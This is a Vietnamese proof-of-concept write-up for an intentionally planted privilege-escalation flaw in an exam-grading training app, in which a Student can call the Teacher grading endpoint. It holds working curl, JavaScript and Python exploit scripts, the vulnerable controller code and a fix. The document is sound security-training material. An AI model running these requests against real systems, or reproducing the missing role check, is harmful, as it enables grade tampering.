# Proof of Concept (PoC) - Lỗ hổng Phân quyền (Privilege Escalation)

## Mô tả lỗ hổng

**Loại lỗ hổng**: Privilege Escalation / Broken Access Control  
**Endpoint bị lỗi**: `POST /Teacher/Exams/Grade`  
**Mức độ**: High  
**Mô tả**: Người dùng có role Student có thể chấm điểm (grade submissions), trong khi chức năng này chỉ dành cho Teacher.

## Nguyên nhân

Endpoint `/Teacher/Exams/Grade` có 2 lỗ hổng bảo mật:

1. **Thiếu role authorization check**: Method chỉ sử dụng class-level `[Authorize]` (không kiểm tra role) thay vì `[Authorize(Roles = "Teacher")]`. Các method khác trong controller đều có `[Authorize(Roles = "Teacher")]`, nhưng method `Grade` thiếu attribute này.

2. **CSRF protection bị tắt**: Method có attribute `[IgnoreAntiforgeryToken]`, cho phép gửi request trực tiếp mà không cần CSRF token (cho mục đích training).

Kết hợp 2 lỗ hổng này cho phép bất kỳ authenticated user nào (bao gồm Student) đều có thể gọi endpoint này để chấm điểm bằng cách thay access_token trong request.

## Các bước thực hiện PoC

### Bước 1: Chuẩn bị môi trường

1. Đảm bảo ứng dụng đang chạy trên `http://localhost:5000`
2. Có ít nhất 2 tài khoản:
   - 1 tài khoản Teacher (để xem danh sách submissions)
   - 1 tài khoản Student (để exploit lỗ hổng)

### Bước 2: Đăng nhập với tài khoản Student

1. Truy cập: `http://localhost:5000/Auth/Login`
2. Đăng nhập với tài khoản Student
3. Lấy cookie `access_token` từ browser:
   - Mở Developer Tools (F12)
   - Vào tab Application > Cookies > `http://localhost:5000`
   - Copy giá trị của cookie `access_token`

### Bước 3: Xác định Submission ID và Exam ID

**Cách 1: Từ giao diện Teacher (nếu có quyền truy cập)**
- Đăng nhập với tài khoản Teacher
- Vào trang Exam Detail để xem danh sách submissions
- Lấy Submission ID và Exam ID từ danh sách

**Cách 2: Từ database**
- Query database để lấy Submission ID và Exam ID
- Hoặc thử các ID hợp lệ (1, 2, 3, ...)

**Cách 3: Từ request của Teacher**
- Bắt request khi Teacher chấm điểm
- Lấy submissionId và examId từ request

### Bước 4: Gửi request chấm điểm bằng tài khoản Student

**Endpoint bị lỗi:**
- URL: `POST http://localhost:5000/Teacher/Exams/Grade`
- Content-Type: `application/x-www-form-urlencoded` (form data)

**Sử dụng cURL:**

```bash
# Lấy cookie access_token từ browser sau khi đăng nhập với Student
TOKEN="your_access_token_here"  # Thay bằng JWT token từ cookie

# Gửi request chấm điểm (thay submissionId, score, examId phù hợp)
curl -X POST "http://localhost:5000/Teacher/Exams/Grade" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: access_token=$TOKEN" \
  -d "submissionId=1&score=9.5&examId=1"
```

**Sử dụng Browser Console (JavaScript):**

1. Mở Developer Tools (F12)
2. Vào tab Console
3. Đăng nhập với tài khoản Student
4. Thực thi script sau:

```javascript
// Lấy cookie access_token
const token = document.cookie
  .split('; ')
  .find(row => row.startsWith('access_token='))
  ?.split('=')[1];

// Tạo form data
const formData = new URLSearchParams();
formData.append('submissionId', '1');  // Thay bằng Submission ID thực tế
formData.append('score', '9.5');       // Điểm muốn chấm (0-10)
formData.append('examId', '1');        // Thay bằng Exam ID thực tế

// Gửi request chấm điểm
fetch('http://localhost:5000/Teacher/Exams/Grade', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': `access_token=${token}`
  },
  credentials: 'include',
  body: formData.toString()
})
.then(response => {
  if (response.redirected) {
    console.log('Success: Redirected to', response.url);
    alert('Đã chấm điểm thành công! (Vulnerability exploited)');
  } else {
    return response.text();
  }
})
.then(data => {
  if (data) console.log('Response:', data);
})
.catch(error => {
  console.error('Error:', error);
});
```

**Sử dụng Python script:**

```python
import requests

# Cấu hình
BASE_URL = "http://localhost:5000"
SUBMISSION_ID = 1  # Thay bằng Submission ID thực tế
SCORE = 9.5        # Điểm muốn chấm (0-10)
EXAM_ID = 1        # Thay bằng Exam ID thực tế

# Đăng nhập với tài khoản Student để lấy token
login_data = {
    "Username": "student_username",  # Thay bằng username của Student
    "Password": "student_password"   # Thay bằng password của Student
}

session = requests.Session()

# Login
login_response = session.post(
    f"{BASE_URL}/Auth/Login",
    data=login_data,
    allow_redirects=False
)

# Lấy token từ cookie
token = session.cookies.get('access_token')
print(f"Token: {token}")

if not token:
    print("Failed to get token. Please check login credentials.")
    exit(1)

# Gửi request chấm điểm
grade_data = {
    "submissionId": SUBMISSION_ID,
    "score": SCORE,
    "examId": EXAM_ID
}

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": f"access_token={token}"
}

response = session.post(
    f"{BASE_URL}/Teacher/Exams/Grade",
    headers=headers,
    data=grade_data,
    allow_redirects=False
)

print(f"Status Code: {response.status_code}")
print(f"Response Headers: {dict(response.headers)}")

if response.status_code in [200, 302, 303]:
    print("\n[!] VULNERABILITY EXPLOITED: Student đã chấm điểm thành công!")
    print(f"[!] Đã chấm điểm {SCORE} cho submission ID {SUBMISSION_ID}")
    if response.status_code in [302, 303]:
        print(f"[!] Redirected to: {response.headers.get('Location', 'N/A')}")
else:
    print(f"\n[X] Request failed: {response.status_code}")
    print(f"Response: {response.text[:500]}")  # Print first 500 chars
```

**Sử dụng Burp Suite hoặc Postman:**

1. **Đăng nhập với Student** và lấy `access_token` cookie
2. **Tạo request mới:**
   - Method: `POST`
   - URL: `http://localhost:5000/Teacher/Exams/Grade`
   - Headers:
     - `Content-Type: application/x-www-form-urlencoded`
     - `Cookie: access_token=YOUR_STUDENT_TOKEN`
   - Body (form-data):
     - `submissionId`: 1
     - `score`: 9.5
     - `examId`: 1
3. **Gửi request** và xác nhận response (302 Redirect hoặc 200 OK)

### Bước 5: Xác minh lỗ hổng

1. **Kiểm tra database** hoặc giao diện để xác nhận điểm đã được cập nhật
2. **Xác nhận** rằng điểm được chấm bởi tài khoản Student (không phải Teacher)
3. **Thử chấm điểm** với các giá trị khác nhau (0-10)
4. **Thử chấm điểm** cho submissions khác nhau

### Bước 6: Kiểm tra log

- Kiểm tra application logs để xem request được thực hiện bởi Student
- Xác nhận rằng không có authorization check được thực hiện

## Kết quả mong đợi

- ✅ Request thành công (200 OK hoặc 302 Redirect)
- ✅ Response redirect đến `/Teacher/Exams/Detail/{examId}`
- ✅ Điểm được cập nhật trong database
- ✅ Student đã thành công trong việc chấm điểm (privilege escalation)
- ✅ Không có lỗi authorization check

## Tác động

1. **Tính toàn vẹn dữ liệu**: Student có thể thay đổi điểm số tùy ý
2. **Phá vỡ quy trình nghiệp vụ**: Quy trình chấm điểm chỉ dành cho Teacher bị phá vỡ
3. **Thiếu công bằng**: Student có thể tự chấm điểm cho mình hoặc người khác
4. **Vi phạm chính sách**: Hệ thống không đảm bảo tính bảo mật và quyền hạn
5. **Giả mạo điểm số**: Student có thể tự tăng điểm hoặc giảm điểm của người khác

## Cách khắc phục

1. **Thêm role check vào method Grade**: Thêm `[Authorize(Roles = "Teacher")]` attribute
2. **Thêm business logic check**: Kiểm tra user có phải là teacher của môn học đó không
3. **Kiểm tra ownership**: Đảm bảo teacher chỉ có thể chấm bài trong môn học của mình

**Code sửa lỗi:**

```csharp
[HttpPost("Exams/Grade")]
[Authorize(Roles = "Teacher")] // Thêm role check
public async Task<IActionResult> Grade(int submissionId, double score, int examId)
{
    var teacherId = GetUserId();
    var exam = await _examService.GetExamByIdAsync(examId);
    if (exam == null) return NotFound();
    
    // Verify teacher teaches the subject of this exam
    var teacher = await _userService.GetUserByIdAsync(teacherId);
    if (teacher == null) return NotFound();
    
    var teacherTeachesSubject = teacher.UserSubjects.Any(us => us.SubjectId == exam.SubjectId);
    if (!teacherTeachesSubject)
    {
        return Forbid("You can only grade exams for subjects you teach.");
    }
    
    // Validate score range
    if (score < 0 || score > 10)
    {
        TempData["Error"] = "Score must be between 0 and 10.";
        return RedirectToAction("ExamDetail", new { id = examId });
    }
    
    await _examService.GradeSubmissionAsync(submissionId, score, teacherId);
    return RedirectToAction("ExamDetail", new { id = examId });
}
```

## Chi tiết kỹ thuật

### Vấn đề trong code:

**File:** `Controllers/View/TeacherController.cs`

**Class-level attribute:**
```csharp
[Authorize] // Chỉ kiểm tra authentication, không kiểm tra role
[Route("Teacher")]
public class TeacherController : Controller
```

**Method Grade (có lỗ hổng):**
```csharp
[HttpPost("Exams/Grade")]
[IgnoreAntiforgeryToken] // VULNERABILITY: Disable CSRF protection
// VULNERABILITY: Thiếu [Authorize(Roles = "Teacher")]
public async Task<IActionResult> Grade(int submissionId, double score, int examId)
{
    // Không có kiểm tra role
    var userId = GetUserId();
    await _examService.GradeSubmissionAsync(submissionId, score, userId);
    // ...
}
```

**So sánh với method khác (an toàn):**
```csharp
[HttpPost("Exams/Create")]
[Authorize(Roles = "Teacher")] // Có kiểm tra role
public async Task<IActionResult> CreateExam(Exam model)
{
    // ...
}
```

### Cách khai thác:

1. Student đăng nhập và lấy `access_token` cookie
2. Student gửi POST request đến `/Teacher/Exams/Grade` với:
   - Cookie: `access_token=STUDENT_TOKEN`
   - Body: `submissionId=X&score=Y&examId=Z`
3. Server chỉ kiểm tra authentication (user đã login) mà không kiểm tra role
4. Request được xử lý thành công → Student đã chấm điểm

## Lưu ý

- Lỗ hổng này được tạo ra **có chủ đích** cho mục đích training/giáo dục về bảo mật
- Trong môi trường production, cần thực hiện đầy đủ các kiểm tra phân quyền
- Luôn áp dụng nguyên tắc "Least Privilege" - chỉ cấp quyền tối thiểu cần thiết
- **Luôn kiểm tra role ở cả class level và method level** để đảm bảo không có method nào bị bỏ sót
- **Sử dụng defense in depth**: Kiểm tra role ở nhiều lớp (authorization attribute, business logic)

## Checklist test

- [ ] Đăng nhập với Student account
- [ ] Lấy access_token từ cookie
- [ ] Xác định submissionId và examId hợp lệ
- [ ] Gửi POST request đến `/Teacher/Exams/Grade`
- [ ] Xác nhận request thành công (200/302)
- [ ] Kiểm tra database để xác nhận điểm đã được cập nhật
- [ ] Thử với các score khác nhau (0, 5, 10, -1, 11)
- [ ] Thử với các submissionId khác nhau
